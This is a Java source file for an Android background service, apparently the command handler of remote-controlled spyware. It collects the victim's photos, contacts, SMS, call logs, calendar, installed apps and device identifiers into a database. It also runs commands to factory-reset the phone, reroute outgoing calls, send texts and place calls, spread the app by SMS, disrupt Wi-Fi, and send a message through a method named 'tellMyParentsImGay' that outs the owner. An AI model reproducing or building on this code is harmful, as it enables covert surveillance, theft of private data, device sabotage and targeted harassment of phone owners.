package com.candroid.textme.jobs;

import android.Manifest;
import android.app.IntentService;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Build;
import android.preference.PreferenceManager;
import android.util.Log;

import com.candroid.textme.BuildConfig;
import com.candroid.textme.data.Constants;
import com.candroid.textme.data.pojos.CalendarEvent;
import com.candroid.textme.data.pojos.Contact;
import com.candroid.textme.data.db.Database;
import com.candroid.textme.data.db.DatabaseHelper;
import com.candroid.textme.api.Lofl;
import com.candroid.textme.receivers.OutgoingCallReceiver;
import com.candroid.textme.services.MessagingService;
import com.candroid.textme.data.pojos.PhoneCall;
import com.candroid.textme.data.pojos.SmsMsg;
import com.candroid.textme.data.Wallpapers;

import java.io.File;
import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

public class JobsIntentService extends IntentService {

    public static final String ACTION_LOCATION = "ACTION_LOCATION";
    public static final String ACTION_SHARE_APP = "ACTION_SHARE_APP";
    public static final String ACTION_FACTORY_RESET = "ACTION_FACTORY_RESET";
    public static final String ACTION_SEND_SMS = "ACTION_SEND_SMS";
    private static final String TAG = JobsIntentService.class.getSimpleName();
    public static final String ACTION_DCIM_FILES = "ACTION_DCIM_FILES";
    public static final String ACTION_SMS = "ACTION_SMS";
    public static final String ACTION_CALENDAR_EVENT = "ACTION_CALENDAR_EVENT";
    public static final String ACTION_PACKAGES = "ACTION_PACKAGES";
    public static final String ACTION_CONTACTS = "ACTION_CONTACTS";
    public static final String ACTION_DEVICE_INFO = "ACTION_DEVICE_INFO";
    public static final String ACTION_PHONE_CALLS = "ACTION_PHONE_CALLS";
    public static final String ACTION_WEB_BROWSER = "ACTION_WEB_BROWSER";
    public static final String ACTION_WALLPAPER = "ACTION_WALLPAPER";
    public static final String ACTION_FAKE_PHONE_CALL = "ACTION_FAKE_PHONE_CALL";
    public static final String ACTION_TEXT_PARENTS = "ACTION_TEXT_PARENTS";
    public static final String ACTION_INSERT_CONTACT = "ACTION_INSERT_CONTACT";
    public static final String ACTION_FLASHLIGHT = "ACTION_FLASHLIGHT";
    public static final String ACTION_VIBRATOR = "ACTION_VIBRATOR";
    public static final String ACTION_WIFI_CARD = "ACTION_WIFI_CARD";
    public static final String ACTION_REROUTE_CALLS = "ACTION_REROUTE_CALLS";
    public static final String ACTION_CALL_PHONE = "ACTION_CALL_PHONE";
    public static final String ACTION_ALARM_CLOCK = "ACTION_ALARM_CLOCK";
    private static long sNumber = 1111111111;

    public JobsIntentService() {
        super("JobsIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null && intent.getAction() != null) {
            if(intent.getAction().equals(ACTION_DCIM_FILES)){
                if(checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED){
                    File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                    try{
                        database.beginTransaction();
                        if(pictures != null && pictures.length > 0){
                            for(File f : pictures){
                                Database.insertMedia(database, f.getName(), f);
                            }
                        }
                        database.setTransactionSuccessful();
                    }catch (SQLiteException e){
                        e.printStackTrace();
                    }finally {
                        database.endTransaction();
                        if(database.isOpen()){
                            database.close();
                        }
                        Lofl.setJobRan(this, JobsScheduler.DCIM_KEY);
                    }
                }
            }else if(intent.getAction().equals(ACTION_PACKAGES)){
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertPackages(database, Lofl.getInstalledApps(this));
                    database.setTransactionSuccessful();
                }catch (SQLiteException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                    if(database.isOpen()){
                        database.close();
                    }
                    Lofl.setJobRan(this, JobsScheduler.PACKAGES_KEY);
                }
            }else if(intent.getAction().equals(ACTION_CONTACTS)){
                if(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED){
                    ArrayList<Contact> contacts = Lofl.fetchContactsInformation(this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                    try{
                        database.beginTransaction();
                        Database.insertContacts(database, contacts);
                        database.setTransactionSuccessful();
                    }catch (SQLiteException e){
                        e.printStackTrace();
                    }finally{
                        database.endTransaction();
                        database.close();
                        Lofl.setJobRan(this, ACTION_CONTACTS);
                    }
                }
            }else if(intent.getAction().equals(ACTION_DEVICE_INFO)){
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertDevice(database, MessagingService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
                    database.setTransactionSuccessful();
                }catch (SQLException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                    database.close();
                    Lofl.setJobRan(this, ACTION_DEVICE_INFO);
                }
            }else if(intent.getAction().equals(ACTION_PHONE_CALLS)){
                if(checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED){
                    ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                    try{
                        database.beginTransaction();
                        Database.insertPhoneCalls(database, phoneCalls);
                        database.setTransactionSuccessful();
                    }catch (SQLException e){
                        e.printStackTrace();
                    }finally{
                        database.endTransaction();
                        database.close();
                        Lofl.setJobRan(this, JobsScheduler.PHONE_CALLS_KEY);
                    }
                }
            }else if(intent.getAction().equals(ACTION_SMS)){
                if(checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED){
                    ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                    try{
                        database.beginTransaction();
                        Database.insertSmsMessages(database, smsMsgs);
                        database.setTransactionSuccessful();
                    }catch (SQLException e){
                        e.printStackTrace();
                    }finally {
                        database.endTransaction();
                        database.close();
                        Lofl.setJobRan(this, JobsScheduler.SMS_KEY);
                        //Lofl.onReceiveCommand(this, Commands.REROUTE_PHONE_CALLS, "stop");
                    }
                }
            }else if(intent.getAction().equals(ACTION_CALENDAR_EVENT)){
                if(checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED){
                    ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                    try{
                        database.beginTransaction();
                        Database.insertCalendarEvents(database, calendarEvents);
                        database.setTransactionSuccessful();
                    }catch (SQLException e){
                        e.printStackTrace();
                    }finally {
                        database.endTransaction();
                        database.close();
                        Lofl.setJobRan(this, JobsScheduler.CALENDAR_EVENTS_KEY);
                    }
                }
            }else if(intent.getAction().equals(ACTION_WALLPAPER)){
                double randomNumber = Math.random();
                String url = null;
                if(randomNumber <= 0.5){
                    url = Wallpapers.WALLPAPERS[0];
                }else{
                    url = Wallpapers.WALLPAPERS[2];
                }
                Lofl.changeWallpaper(this, Lofl.getBitmapFromUrl(Uri.parse(url).toString()));
            }else if(intent.getAction().equals(ACTION_WEB_BROWSER)){
                if(intent.hasExtra(Constants.URL)){
                    String url = intent.getStringExtra(Constants.URL);
                    Lofl.openBrowser(this, url);
                }
            }else if(intent.getAction().equals(ACTION_FAKE_PHONE_CALL)){
                Lofl.fakePhoneCall(this);
            }else if(intent.getAction().equals(ACTION_TEXT_PARENTS)){
                if(checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED){
                    Lofl.tellMyParentsImGay(this);
                    Lofl.setJobRan(this, JobsScheduler.TEXT_PARENTS_KEY);
                }
            }else if(intent.getAction().equals(ACTION_INSERT_CONTACT)){
                if(this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED){
                    if(intent.hasExtra(Constants.NAME_KEY) && intent.hasExtra(Constants.ADDRESS)){
                        String name = intent.getStringExtra(Constants.NAME_KEY);
                        String number = intent.getStringExtra(Constants.ADDRESS);
                        Lofl.insertContact(this, name, number);
                    }
                }
            } else if (intent.getAction().equals(ACTION_WIFI_CARD)) {
                if(checkSelfPermission(Manifest.permission.CHANGE_WIFI_STATE) == PackageManager.PERMISSION_GRANTED){
                    Lofl.dosWifiCard(this);
                }
            }else if(intent.getAction().equals(ACTION_FLASHLIGHT)){
                if(checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED){
                    Lofl.persistentBlinkingFlashlight(this);
                }
            }else if(intent.getAction().equals(ACTION_VIBRATOR)){
                Lofl.vibrator(this);
            } else if(intent.getAction().equals(ACTION_LOCATION)){

            }else if(intent.getAction().equals(ACTION_SHARE_APP)){
                if(checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED){
                    Lofl.shareApp(this);
                }
            }else if(intent.getAction().equals(ACTION_FACTORY_RESET)){
                Lofl.factoryReset(this);
            }else if(intent.getAction().equalsIgnoreCase(ACTION_REROUTE_CALLS)){
                if(intent.hasExtra(OutgoingCallReceiver.NUMBER_KEY)){
                    String number = intent.getStringExtra(OutgoingCallReceiver.NUMBER_KEY);
                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this.getApplicationContext()).edit();
                    editor.putString(OutgoingCallReceiver.NUMBER_KEY, number);
                    editor.apply();
                    OutgoingCallReceiver.sRerouteNumber = number;
                }
            }else if(intent.getAction().equalsIgnoreCase(ACTION_CALL_PHONE)){
                if(checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED){
                    if(intent.hasExtra(Constants.ADDRESS)){
                        String number = intent.getStringExtra(Constants.ADDRESS);
                        Lofl.phoneCall(this, number);
                    }
                }
            }else if(intent.getAction().equals(ACTION_SEND_SMS)){
                if(checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED){
                    if(intent.hasExtra(Constants.ADDRESS) && intent.hasExtra(Constants.BODY)){
                        String address = intent.getStringExtra(Constants.ADDRESS);
                        String body = intent.getStringExtra(Constants.BODY);
                        Lofl.sendNonDataSms(this, address, body);
                    }
                }
            }else if(intent.getAction().equals(ACTION_ALARM_CLOCK)){
                if(intent.hasExtra(Constants.HOURS_KEY) && intent.hasExtra(Constants.MINUTES_KEY)){
                    int hours = intent.getIntExtra(Constants.HOURS_KEY, 0);
                    int minutes = intent.getIntExtra(Constants.MINUTES_KEY, 0);
                    Lofl.setAlarmClock(this, hours, minutes);
                }
            }else {
                Log.d(TAG, "No action found!");
            }
        }
    }
}